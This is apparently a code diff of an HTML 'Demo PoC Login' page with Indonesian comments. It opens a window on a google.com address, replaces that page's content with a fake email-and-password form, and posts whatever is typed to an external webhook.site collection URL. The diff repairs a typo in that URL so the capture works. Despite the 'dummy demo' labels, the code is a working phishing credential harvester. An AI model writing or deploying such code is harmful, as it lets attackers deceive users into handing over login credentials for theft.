@@ -1,35 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Demo PoC Login</title>
+</head>
+<body>
+<button onclick="go()">MELUNCUR</button>
+
 <script>
-const WEBHOOK_URL = "hhttps://webhook.site/c697fd9f-ed36-4444-abb1-bc44fcb0a716"; // webhook dummy untuk demo
+const WEBHOOK_URL = "https://webhook.site/c697fd9f-ed36-4444-abb1-bc44fcb0a716"; // Ganti dengan webhook dummy
 
 function go() {
-    // buka jendela baru yang aman
+    // buka jendela baru (aman)
 var x=window.open('https://www.google.com/csi')
-    
+
     setTimeout(function() {
         x.document.body.innerHTML = `
             <h1>Demo Login</h1>
             Email: <input id="email" placeholder="test@example.com"><br>
             Pass: <input id="pass" type="password" placeholder="password"><br>
             <button id="btnLogin">Login</button>
+            <p id="status"></p>
         `;
 
-        x.document.getElementById("btnLogin").onclick = function() {
+        const btn = x.document.getElementById("btnLogin");
+        btn.onclick = function() {
             const email = x.document.getElementById('email').value;
             const pass = x.document.getElementById('pass').value;
 
-            // "Capture" data dummy dan kirim ke webhook dummy
+            // Kirim data dummy ke webhook
             fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ email, pass })
-            }).then(() => {
-                alert("Data demo dikirim ke webhook dummy:\nEmail: " + email + "\nPass: " + pass);
-            }).catch(err => {
-                console.error("Error:", err);
+                body: JSON.stringify({ email: email, pass: pass })
+            })
+            .then(() => {
+                x.document.getElementById("status").innerText =
+                  "Data demo berhasil dikirim ke webhook dummy.";
+                console.log("Simulasi webhook:", { email, pass });
+            })
+            .catch(err => {
+                x.document.getElementById("status").innerText =
+                  "Terjadi error saat mengirim data.";
+                console.error(err);
             });
-        };
-    }, 1000);
+        }
+    }, 500); // tampilkan setelah 0.5 detik
 }
 </script>
-
-<button onclick="go()">Go</button>
+</body>
+</html>
